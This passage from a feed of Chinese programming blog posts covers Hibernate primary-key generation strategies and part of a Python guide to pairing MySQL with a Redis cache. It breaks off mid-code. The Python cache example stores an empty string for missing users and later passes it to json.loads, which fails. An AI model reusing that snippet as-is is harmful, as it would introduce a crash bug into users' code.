        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// 记录启动失败的错误</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">实体类 Student</h4>
<h5 data-id="heading-5">使用 AUTO 生成策略</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.AUTO)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h5 data-id="heading-6">使用 IDENTITY 生成策略</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h5 data-id="heading-7">使用 SEQUENCE 生成策略</h5>
<p>如果使用SEQUENCE策略，需要在数据库中创建一个序列。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> SEQUENCE student_seq <span class="hljs-keyword">START</span> <span class="hljs-keyword">WITH</span> <span class="hljs-number">1</span> INCREMENT <span class="hljs-keyword">BY</span> <span class="hljs-number">1</span>;
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.SequenceGenerator;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "student_seq")</span>
    <span class="hljs-meta">@SequenceGenerator(name = "student_seq", sequenceName = "student_seq", allocationSize = 1)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h5 data-id="heading-8">使用 TABLE 生成策略</h5>
<p>如果使用TABLE策略，需要在数据库中创建一个主键生成表。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hibernate_sequences (
    sequence_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    sequence_next_val <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    <span class="hljs-keyword">PRIMARY</span> KEY (sequence_name)
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hibernate_sequences (sequence_name, sequence_next_val) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'student_seq'</span>, <span class="hljs-number">1</span>);
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.TableGenerator;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.TABLE, generator = "student_gen")</span>
    <span class="hljs-meta">@TableGenerator(name = "student_gen", table = "hibernate_sequences", pkColumnName = "sequence_name",
                    valueColumnName = "sequence_next_val", pkColumnValue = "student_seq", allocationSize = 1)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters 和 setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h3 data-id="heading-9">事务管理</h3>
<p>在进行数据库操作时，需要开启事务，并在操作完成后提交事务。如果操作失败，则回滚事务以确保数据一致性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

        <span class="hljs-comment">// 向数据库添加一个对象</span>
        <span class="hljs-keyword">try</span> {
            session = sessionFactory.openSession();
            transaction = session.beginTransaction();

            <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">20</span>);
            session.save(student);

            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-10">总结</h3>
<p>通过以上示例，可以看出Hibernate提供了多种策略来生成实体的主键，包括<code>AUTO</code>、<code>IDENTITY</code>、<code>SEQUENCE</code>和<code>TABLE</code>。不同的策略适用于不同的数据库和场景。理解这些主键生成策略，并在实际项目中正确应用，可以有效地管理数据库表中的主键。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL 和 Redis搭配使用指南]]></title>    <link>https://juejin.cn/post/7589935326781751330</link>    <guid>https://juejin.cn/post/7589935326781751330</guid>    <pubDate>2026-01-01T08:13:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781751330" data-draft-id="7589920318132781056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL 和 Redis搭配使用指南"/> <meta itemprop="keywords" content="Redis,MySQL"/> <meta itemprop="datePublished" content="2026-01-01T08:13:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈里谢顿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL 和 Redis搭配使用指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈里谢顿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:13:55.000Z" title="Thu Jan 01 2026 08:13:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MySQL 和 Redis 是现代应用架构中经典的 <strong>“持久存储 + 高速缓存”</strong> 组合。它们各自优势互补：</p>
<ul>
<li><strong>MySQL</strong>：强一致性、事务支持、持久化，适合存储核心业务数据（如用户信息、订单）。</li>
<li><strong>Redis</strong>：内存数据库、微秒级响应、丰富数据结构，适合缓存热点数据、会话、排行榜等。</li>
</ul>
<hr/>
<h2 data-id="heading-0">✅ 一、典型搭配模式</h2>





























<table><thead><tr><th>场景</th><th>策略</th></tr></thead><tbody><tr><td><strong>读多写少的数据</strong>（如商品详情）</td><td>先查 Redis，命中则返回；未命中查 MySQL，再写入 Redis</td></tr><tr><td><strong>写操作</strong>（如更新用户资料）</td><td>先更新 MySQL，再删除/更新 Redis 中的缓存（<strong>Cache-Aside Pattern</strong>）</td></tr><tr><td><strong>防止缓存穿透</strong></td><td>对空结果也缓存（短 TTL），或使用布隆过滤器</td></tr><tr><td><strong>防止缓存雪崩</strong></td><td>设置随机过期时间</td></tr><tr><td><strong>防止缓存击穿</strong></td><td>对热点 key 使用互斥锁（如 Redis 分布式锁）</td></tr></tbody></table>
<blockquote>
<p>📌 <strong>核心原则</strong>：<strong>以 MySQL 为唯一真实数据源，Redis 仅为缓存</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">✅ 二、Python 实战示例（使用 <code>pymysql</code> + <code>redis-py</code>）</h2>
<h3 data-id="heading-2">1. 安装依赖</h3>
<pre><code class="hljs">pip install pymysql redis
</code></pre>
<h3 data-id="heading-3">2. 初始化连接</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-comment"># Redis 连接（带连接池）</span>
redis_client = redis.Redis(
    host=<span class="hljs-string">'localhost'</span>,
    port=<span class="hljs-number">6379</span>,
    decode_responses=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 自动解码 bytes 为 str</span>
    socket_connect_timeout=<span class="hljs-number">2</span>,
    socket_timeout=<span class="hljs-number">2</span>
)

<span class="hljs-comment"># MySQL 连接配置</span>
DB_CONFIG = {
    <span class="hljs-string">'host'</span>: <span class="hljs-string">'localhost'</span>,
    <span class="hljs-string">'user'</span>: <span class="hljs-string">'root'</span>,
    <span class="hljs-string">'password'</span>: <span class="hljs-string">'your_password'</span>,
    <span class="hljs-string">'database'</span>: <span class="hljs-string">'blog_db'</span>,
    <span class="hljs-string">'charset'</span>: <span class="hljs-string">'utf8mb4'</span>,
    <span class="hljs-string">'cursorclass'</span>: pymysql.cursors.DictCursor
}

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db_connection</span>():
    conn = pymysql.connect(**DB_CONFIG)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
    <span class="hljs-keyword">finally</span>:
        conn.close()
</code></pre>
<hr/>
<h3 data-id="heading-4">3. 缓存策略实现：<strong>Cache-Aside（旁路缓存）</strong></h3>
<h4 data-id="heading-5">📌 场景：根据用户 ID 获取用户信息</h4>
<pre><code class="hljs language-python" lang="python">CACHE_PREFIX = <span class="hljs-string">"user:"</span>
CACHE_TTL = <span class="hljs-number">300</span>  <span class="hljs-comment"># 5分钟</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-string">"""从缓存或数据库获取用户"""</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    
    <span class="hljs-comment"># 1. 先查 Redis</span>
    cached = redis_client.get(cache_key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"✅ Hit cache"</span>)
        <span class="hljs-keyword">return</span> json.loads(cached)
    
    <span class="hljs-comment"># 2. 缓存未命中，查 MySQL</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"❌ Cache miss, querying MySQL..."</span>)
    <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
            cursor.execute(<span class="hljs-string">"SELECT id, name, email FROM users WHERE id = %s"</span>, (user_id,))
            user = cursor.fetchone()
    
    <span class="hljs-keyword">if</span> user:
        <span class="hljs-comment"># 3. 写入缓存（注意：序列化为 JSON）</span>
        redis_client.setex(cache_key, CACHE_TTL, json.dumps(user))
        <span class="hljs-keyword">return</span> user
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 4. 防止缓存穿透：对空结果也缓存（短时间）</span>
        redis_client.setex(cache_key, <span class="hljs-number">60</span>, <span class="hljs-string">""</span>)  <span class="hljs-comment"># 空值缓存 60 秒</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">4. 更新数据时同步缓存</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, name: <span class="hljs-built_in">str</span>, email: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""更新用户信息，并失效缓存"""</span>
    <span class="hljs-comment"># 1. 先更新 MySQL</span>
    <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
            cursor.execute(
                <span class="hljs-string">"UPDATE users SET name=%s, email=%s WHERE id=%s"</span>,
                (name, email, user_id)
            )
            conn.commit()
    
    <span class="hljs-comment"># 2. 删除 Redis 缓存（推荐“删除”而非“更新”，避免并发不一致）</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    redis_client.delete(cache_key)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"🧹 Cache invalidated for user <span class="hljs-subst">{user_id}</span>"</span>)
</code></pre>
<blockquote>
<p>💡 <strong>为什么删除而不是更新？</strong></p>
<ul>
<li>更新需查 DB 再写缓存，多一次查询</li>
<li>并发场景下可能写入旧数据（先更新 DB 的请求后写缓存）</li>
<li><strong>删除更简单安全</strong>：下次读自动加载最新数据</li>
</ul>
</blockquote>
<hr/>
<h3 data-id="heading-7">5. 防止缓存击穿：热点 Key 加锁</h3>
<blockquote>
<p>当某个 key 过期瞬间，大量请求同时击穿到 DB。</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> uuid

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_safe</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-string">"""带分布式锁防止缓存击穿"""</span>
    cache_key = <span class="hljs-string">f"<span class="hljs-subst">{CACHE_PREFIX}</span><span class="hljs-subst">{user_id}</span>"</span>
    
    <span class="hljs-comment"># 1. 查缓存</span>
    cached = redis_client.get(cache_key)
    <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> json.loads(cached)
    
    <span class="hljs-comment"># 2. 尝试获取分布式锁（锁名 = cache_key + ":lock"）</span>
    lock_key = cache_key + <span class="hljs-string">":lock"</span>
    lock_value = <span class="hljs-built_in">str</span>(uuid.uuid4())
    lock_ttl = <span class="hljs-number">5000</span>  <span class="hljs-comment"># 5秒</span>
    
    <span class="hljs-comment"># 使用 Lua 脚本原子加锁（见前文）</span>
    lock_script = redis_client.register_script(<span class="hljs-string">"""
    if redis.call("SET", KEYS[1], ARGV[1], "NX", "PX", ARGV[2]) then
        return 1
    else
        return 0
    end
    """</span>)
    
    <span class="hljs-keyword">if</span> lock_script(keys=[lock_key], args=[lock_value, lock_ttl]):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 双重检查：可能其他线程已加载</span>
            cached = redis_client.get(cache_key)
            <span class="hljs-keyword">if</span> cached <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">return</span> json.loads(cached)
            
            <span class="hljs-comment"># 查询 DB 并写缓存</span>
            <span class="hljs-keyword">with</span> get_db_connection() <span class="hljs-keyword">as</span> conn:
                <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:
                    cursor.execute(<span class="hljs-string">"SELECT id, name, email FROM users WHERE id = %s"</span>, (user_id,))
                    user = cursor.fetchone()
            
            <span class="hljs-keyword">if</span> user:
